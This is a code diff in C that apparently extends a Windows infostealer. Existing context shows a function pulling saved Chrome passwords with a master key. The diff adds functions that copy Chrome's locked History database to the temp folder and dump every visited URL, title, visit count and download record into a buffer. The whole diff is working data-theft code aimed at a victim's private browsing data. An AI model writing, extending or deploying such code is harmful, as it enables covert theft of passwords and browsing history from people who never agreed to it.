@@ -10,6 +10,8 @@
 
 #define CHROME_LOGIN_DATA \
     "C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
+#define CHROME_HISTORY \
+    "C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
 
 // "C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"
 
@@ -180,5 +182,124 @@ char* get_browser_password() {
     DeleteFileA(temp_db);
     free(master_key);
 
+    return out;
+}
+
+// Must free returned pointer
+char* get_browser_history() {
+    char db_path[MAX_PATH];
+    ExpandEnvironmentStringsA(CHROME_HISTORY, db_path, MAX_PATH);
+
+    // Copy DB to temp location because Chrome locks it
+    char temp_db[MAX_PATH];
+    snprintf(temp_db, sizeof(temp_db), "%s\\History.tmp", getenv("TEMP")); // %TEMP% is C:\Users\user\AppData\Local\Temp
+
+    if (!CopyFileA(db_path, temp_db, FALSE)) {
+        return NULL;
+    }
+
+    sqlite3* db;
+    if (sqlite3_open(temp_db, &db) != SQLITE_OK) {
+        printf("[-] Cannot open database\n");
+        return NULL;
+    }
+
+    sqlite3_stmt* stmt;
+    const char* sql = "SELECT url, title, visit_count, last_visit_time FROM urls";
+    
+    // Allocate a big buffer to return
+    size_t out_size = 1024 * 1024;
+    char* out = malloc(out_size);
+    size_t offset = 0;
+    if (!out) {
+        sqlite3_close(db);
+        DeleteFileA(temp_db);
+        return NULL;
+    }
+    out[0] = '\0';
+
+    if (sqlite3_prepare_v2(db, sql, -1, &stmt, 0) == SQLITE_OK) {
+        while (sqlite3_step(stmt) == SQLITE_ROW) {
+
+            const char* url  = (const char*)sqlite3_column_text(stmt, 0);
+            const char* title = (const char*)sqlite3_column_text(stmt, 1);
+            const char* visit_count = (const char*)sqlite3_column_text(stmt, 2);
+            const char* last_visit_time = (const char*)sqlite3_column_text(stmt, 3);
+
+            // Append formatted line into output buffer
+            int written = snprintf(out + offset, out_size - offset,
+                          "URL: %s\tTITLE: %s\tVISIT_COUNT: %s\tLAST_VISIT_TIME: %s\n",
+                          url ? url : "", title ? title : "", visit_count ? visit_count : "", last_visit_time ? last_visit_time : "");
+    
+            if (written > 0 && (offset + written) < out_size) {
+                offset += written;
+            }
+        }
+
+        sqlite3_finalize(stmt);
+    }
+
+    sqlite3_close(db);
+    DeleteFileA(temp_db);
+
+    return out;
+}
+
+// Must free returned pointer
+char* get_browser_downloads() {
+    char db_path[MAX_PATH];
+    ExpandEnvironmentStringsA(CHROME_HISTORY, db_path, MAX_PATH);
+
+    // Copy DB to temp location because Chrome locks it
+    char temp_db[MAX_PATH];
+    snprintf(temp_db, sizeof(temp_db), "%s\\Downloads.tmp", getenv("TEMP")); // %TEMP% is C:\Users\user\AppData\Local\Temp
+
+    if (!CopyFileA(db_path, temp_db, FALSE)) {
+        return NULL;
+    }
+
+    sqlite3* db;
+    if (sqlite3_open(temp_db, &db) != SQLITE_OK) {
+        printf("[-] Cannot open database\n");
+        return NULL;
+    }
+
+    sqlite3_stmt* stmt;
+    const char* sql = "SELECT target_path, last_access_time, tab_url, mime_type FROM downloads";
+    
+    // Allocate a big buffer to return
+    size_t out_size = 1024 * 1024;
+    char* out = malloc(out_size);
+    size_t offset = 0;
+    if (!out) {
+        sqlite3_close(db);
+        DeleteFileA(temp_db);
+        return NULL;
+    }
+    out[0] = '\0';
+
+    if (sqlite3_prepare_v2(db, sql, -1, &stmt, 0) == SQLITE_OK) {
+        while (sqlite3_step(stmt) == SQLITE_ROW) {
+
+            const char* target_path  = (const char*)sqlite3_column_text(stmt, 0);
+            const char* last_access_time = (const char*)sqlite3_column_text(stmt, 1);
+            const char* site_url = (const char*)sqlite3_column_text(stmt, 2);
+            const char* mime_type = (const char*)sqlite3_column_text(stmt, 3);
+
+            // Append formatted line into output buffer
+            int written = snprintf(out + offset, out_size - offset,
+                          "TARGET: %s\tLAST_ACCESS_TIME: %s\tURL: %s\tMIME_TYPE: %s\n",
+                          target_path ? target_path : "", last_access_time ? last_access_time : "", site_url ? site_url : "", mime_type ? mime_type : "");
+    
+            if (written > 0 && (offset + written) < out_size) {
+                offset += written;
+            }
+        }
+
+        sqlite3_finalize(stmt);
+    }
+
+    sqlite3_close(db);
+    DeleteFileA(temp_db);
     return out;
 }
